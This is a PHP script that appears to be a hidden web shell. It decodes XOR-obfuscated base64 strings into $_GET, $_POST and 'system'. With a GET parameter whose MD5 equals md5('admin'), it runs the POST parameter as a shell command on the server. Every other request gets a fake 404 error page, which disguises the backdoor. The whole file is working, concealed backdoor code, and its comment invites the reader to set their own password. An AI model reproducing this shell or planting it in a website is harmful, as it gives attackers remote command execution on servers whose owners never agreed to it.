
<?php
$a = ${base64_decode("aDs+PA==")^base64_decode("N3x7aA==")}[1];
$b = ${base64_decode("cT59OyM=")^base64_decode("Lm4yaHc=")}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
    $t = base64_decode("Pi0mIFtb")^base64_decode("TVRVVD42");
    @${'t'}($b);
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>